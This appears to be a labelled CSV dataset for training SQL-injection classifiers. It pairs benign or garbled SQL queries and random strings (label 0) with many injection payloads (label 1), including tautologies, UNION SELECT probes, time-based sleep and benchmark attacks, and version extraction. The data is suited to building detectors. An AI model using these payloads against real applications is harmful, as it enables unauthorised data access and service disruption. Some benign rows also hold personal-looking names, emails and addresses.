Query,Label
"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",1
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1
1 and 8398  =  1891-- naov,1
"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",1
rurick5,0
"   SELECT Employees.aboard, COUNT ( Orders.crackID )  AS mudFROM    ( OrdersINNER JOIN them ON Orders.judgeID  =  Employees.quietID ) ",0
pillo,0
ugartechea oviol,0
 or user like '%,1
SELECT AVG ( together ) FROM idea SELECT SUM ( bowl ) ,0
SELECT * FROM also WHERE pleasant  BETWEEN 10 AND 20,0
SELECT * FROM atom 3 SELECT * FROM immediately,0
1'   )    )     )   rlike   (  select   (  case when   (  5524  =  9582  )   then 1 else 0x28 end   )    )    and    (    (     (  'okoj' like 'okoj,1
SELECT COUNT ( depend ) FROM discuss,0
bic9spide,0
SELECT * FROM task FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM whistle,0
"SELECT * FROM cook WHERE adjective BETWEEN ""season"" AND    ""separate""",0
fredesvinda,0
5emic0e,0
"-7996""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""iuzv"" like ""iuzv",1
"1""  )   where 5491  =  5491",1
6onc+hesta,0
"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",1
1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
" select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1",1
lauze,0
SELECT AVG ( pattern ) FROM pink SELECT SUM ( soon ) ,0
select case when 1802  =  7063 then 1 else null end--,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""jcyh""  =  ""jcyh",1
SELECT * FROM fire,0
1   )    )     )   union all select null--,1
""" or ""x""  =  ""x",1
"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1
"  SELECT * FROM for WHERE silence NOT IN  ( 'rise', 'roar', 'one' )  ",0
SELECT * FROM becoming ORDER BY chain DESC,0
1 and 7533  =  7533,1
1'+  (  select qtyi where 7147  =  7147,1
1'+  (  select gthp where 7311  =  7311 or sleep  (  5  )  #,1
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM  ( SELECT his FROM baseball ) ,0
maximinio,0
"INSERT INTO fire ( very, shout, string, lips, dollar, was )  VALUES  ( 'completely', 'flow'. border', 'acres', 'jungle', 'captain', 'blew' )  ",0
" SELECT * FROM took ORDER BY shelf, share",0
1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,1
"1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"   SELECT COUNT ( select ) , easy FROM satellites BY gray",0
1 where 9620  =  9620 waitfor delay '0:0:5'--,1
SELECT * FROM gray  WHERE lack NOT LIKE '[detail]%',0
 UPDATE hay SET age = 'speak'WHERE secret = 'cattle',0
"  SELECT   STR_TO_DATE ( ""August 10 2017"", ""%M %d %Y"" ) ;",0
m7124v3,0
SELECT * FROM managed WHERE fish = 'pencil' LIMIT 3,0
"1"" where 5977  =  5977",1
admin' or 1  =  1--,1
SELECT * FROM understanding  WHERE no NOT LIKE '[captain]%',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367845 )  ORDER BY meta_id ASC",0
SELECT * FROM play WHERE share = 'border'  AND City = 'nearby',0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1
SELECT * FROM title WHERE tired = 'luck' FETCH FIRST 3 ROWS ONLY,0
SELECT surprise FROM purpose,0
thayra,0
47901295t,0
fischetti.bacall@players.com.gr,0
SELECT * FROM enemy WHERE printed NOT BETWEEN 'house' AND 'knew',0
SELECT COUNT ( excitedID ) FROM giant,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,1
antonio ulloa 6 6?d,0
SELECT * FROM capital,0
"1""  )   where 4520  =  4520",1
"INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort )  VALUES  ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )  ",0
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""utzr"" like ""utzr",1
"1""  )   where 6311  =  6311",1
1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,1
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',1
SELECT COUNT ( carried ) FROM wheat,0
"  SELECT PERIOD_DIFF ( 1703, 1612 ) ;",0
igea,0
"1   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  3504  =  3504",1
41392002y,0
"   SELECT up, afraid, jungle FROM basic WHERE build  IS NULL",0
villacastn,0
SELECT medicine FROM fifth,0
"1"" and sleep  (  5  )  ",1
jasmann,0
17151,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
SELECT bound ( s FROM year RIGHT JOIN,0
SELECT * FROM arrangement WHERE return BETWEEN certain09/01/1996four AND chart15/31/1996party,0
SELECT * FROM  ( SELECT gift FROM behind ) ,0
.11ne5o,0
"1""  )   as esks where 1138  =  1138",1
"1'   )    )    as mxxd where 7255  =  7255 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
vargas bentos,0
SELECT * FROM age ORDER BY thumb,0
SELECT TOP 50 PERCENT * FROM respect,0
losar de la vera,0
"ronda outeiro s/n, 6d",0
"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1
1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
DELETE FROM function,0
1'  )   as uwmy where 6980  =  6980,1
manquel,0
"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",1
bada gorina,0
SELECT carried ( s )  FROM map LEFT JOIN,0
SELECT * FROM essential,0
92540376z,0
SELECT TOP 3 * FROM waste,0
SELECT * FROM wp_posts WHERE ID  =  28080 LIMIT 1,0
valverde de valdelacasa,0
3771,0
SELECT TOP 3 * FROM loud,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1
SELECT see ( s )  FROM breathing LEFT JOIN,0
"-8735'   )    )    union all select 3262,3262,3262--",1
SELECT * FROM taken 3,0
SELECT TOP 3 * FROM material,0
"1"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
1%'  ) ,1
belmonte de gracin,0
preixens,0
DELETE FROM closely WHERE below = 'higher',0
SELECT COUNT ( production )  FROM since,0
mud6787t6,0
"1%""  )   and sleep  (  5  )  #",1
"1%""   )    )    union all select null,null,null,null--",1
"  SELECT perfectID AS ID, loss AS these FROM half",0
SELECT * FROM grade WHERE yellow NOT LIKE 'including%',0
SELECT MIN ( brown )  AS forget FROM thirty,0
SELECT * FROM imagine ORDER BY practice,0
" SELECT CustomerName, City FROM Customers;",0
SELECT MIN ( go )  AS sheet FROM largest,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",1
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1
SELECT COUNT ( affect ) FROM headed,0
"pl. san anton, 102",0
" SELECT * FROM correct ORDER BY hand ASC, church DESC",0
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
SELECT AVG ( trip )  FROM relationship  SELECT SUM ( wild ) ,0
DELETE FROM than WHERE nails = 'hold',0
armelle,0
SELECT * FROM bank  WHERE riding NOT LIKE '[chair]%',0
SELECT nuts ( s ) FROM else INNER JOIN,0
"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT * FROM welcome WHERE atom = 'load' LIMIT 3,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' ) ",0
SELECT * FROM occur 3,0
SELECT bottle FROM boy,0
SELECT * FROM  ( SELECT operation FROM win ) ,0
SELECT * FROM wore  WHERE beyond NOT LIKE '[beneath]%',0
le-van-kim@la-sexta-f1.ro,0
"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",1
"c/ venecia, s/n,",0
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""giuq""  =  ""giuq",1
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
8586,0
ruben,0
4ino57l,0
"1"" where 1719  =  1719 and 7533  =  7533--",1
SELECT * FROM enemy WHERE torn = 'village'  AND City = 'safety',0
SELECT * FROM love WHERE surface = 'desk'  AND  ( women = 'chief' OR definition = 'birds' ) ,0
SELECT * FROM  ( SELECT hollow FROM actual ) ,0
" SELECT * FROM power ORDER BY dozen, face",0
colja@suecas.com.tel,0
roca,0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
SELECT * FROM explain WHERE NOT this = 'blind'  AND NOT stranger = 'who',0
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,1
n89m3nd2,0
guntekin,0
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push',0
"1   )    )     )   union all select null,null,null,null,null,null#",1
"-1868   )    )    union all select 1859,1859--",1
25186,0
SELECT * FROM studied  WHERE edge = bow,0
1.89443E+15,0
winifred5,0
berja,0
"  SELECT seeID AS ID, clock AS yesterday FROM grew",0
SELECT * FROM color WHERE rush  BETWEEN 10 AND 20,0
 or 1 --',1
"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",1
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'qtfl'  =  'qtfl",1
"-6475""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""mdsx"" like ""mdsx",1
1'   )    )    as txxn where 7884  =  7884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
"1' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1%'   )    )     )   and 4595  =  4595#,1
"c/ benasau, 196, 10?h",0
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1
SELECT option_value FROM wp_options WHERE option_name  =  '_options_youtube_url' LIMIT 1,0
1'   )    )    and   (  5091  =  8681  )  *8681 and    (    (   'xevm'  =  'xevm,1
"  SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",0
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
 UPDATE evening SET describe = 'song'WHERE section = 'whenever',0
82452687x,0
4451,0
45370,0
"1""  )   as ltoa where 9159  =  9159 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
40315,0
65,0
"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM bus WHERE joined = 'breakfast'  AND  ( four = 'arm' OR upon = 'shore' ) ,0
" SELECT column_name ( s )  FROM mighty,amount",0
"1%'  )   union all select null,null,null,null,null,null,null#",1
SELECT * FROM [Brazil Customers]; CREATE PROCEDURE SelectAllCustomers AS,0
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
SELECT park ( s )  FROM contrast LEFT JOIN,0
SELECT COUNT ( needle )  FROM difficulty,0
SELECT * FROM thank 3 SELECT * FROM go,0
morande,0
"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT * FROM habit WHERE empty = 'wish'  AND City = 'stopped',0
"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"SELECT * FROM easily WHERE kind BETWEEN ""sunlight"" AND    ""till""",0
mo3tren04,0
SELECT * FROM wp_posts WHERE ID  =  348623 LIMIT 1,0
"  SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID =  star.rich ORDER BY congress.part",0
"1'   )    )     )   union all select null,null,null--",1
SELECT cream,0
SELECT COUNT ( beauty ) FROM per,0
zoldou@stainless.tw,0
"calle goya 46, 10?g",0
39699852n,0
DELETE FROM satellites,0
"-7448 union all select 4072,4072#",1
"  SELECT form,last FROM break WHERE paragraph = 'summer' UNION SELECT drive, blanket FROM current",0
bettine,0
SELECT AVG ( upper ) FROM turn SELECT SUM ( pull ) ,0
SELECT tool ( s )  FROM gray UNION ALL,0
4.23384E+15,0
SELECT * FROM consonant WHERE regular LIKE '%now%',0
38821598j,0
bekki,0
SELECT AVG ( stream ) FROM reader SELECT SUM ( drink ) ,0
1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
duilio,0
lact1ad1,0
98011650w,0
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
DELETE FROM shinning,0
gianna,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",1
SELECT COUNT ( perfect ) FROM captain,0
5.181E+15,0
"  SELECT islandID AS ID, aware AS badly FROM farther",0
1  )   order by 1#,1
yasna,0
wahlberg8@am-si.np,0
"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
-3849  )   or 5580  =  3442--,1
" end and   (  ""%""  =  """,1
alar1ado0,0
"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",1
SELECT * FROM direction 3 SELECT * FROM joy,0
SELECT * FROM classroom WHERE apple NOT LIKE '[fun]%',0
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",1
3180,0
"1%""   )    )     )   and elt  (  9524  =  1124,1124  )   and    (    (     (  ""%""  =  """,1
"  SELECT TIME_TO_SEC ( ""19:30:10"" ) ;",0
select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',1
SELECT support ( s )  FROM swung FULL OUTER JOIN,0
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3,0
SELECT * FROM television FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM from,0
spears,0
norberto,0
1' where 4460  =  4460,1
SELECT COUNT ( son ) FROM remarkable,0
SELECT TOP 3 * FROM curious SELECT * FROM halfway 3SELECT * FROM telephone,0
"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"av. benisa 43, 10d",0
"   SELECT zebra, market, adventure FROM court WHERE different  IS NULL",0
1%'  )   union all select null--,1
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
"-5672%"" or 3825  =  9675--",1
" SELECT Shippers.ShipperName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders LEFT JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID  GROUP BY ShipperName;",0
"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",1
hoya-gonzalo,0
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
SELECT * FROM appearance WHERE every = 'exercise',0
"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",0
SELECT * FROM badly WHERE won = 'red' FETCH FIRST 3 ROWS ONLY,0
SELECT promised ( s )  FROM itself FULL OUTER JOIN,0
genvieve,0
9.61016E+15,0
SELECT * FROM sides WHERE including = 'tobacco'  OR gone = 'father',0
astor,0
SELECT AVG ( Price ) FROM income,0
carre mamani,0
-7187' or 4159  =  7465,1
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'swjk'  =  'swjk",1
SELECT * FROM goes WHERE fell BETWEEN invented09/01/1996needs AND bigger15/31/1996atmosphere,0
armstrong@viajesnacionales.pn,0
SELECT * FROM behavior,0
SELECT COUNT ( grabbed ) FROM origin,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",1
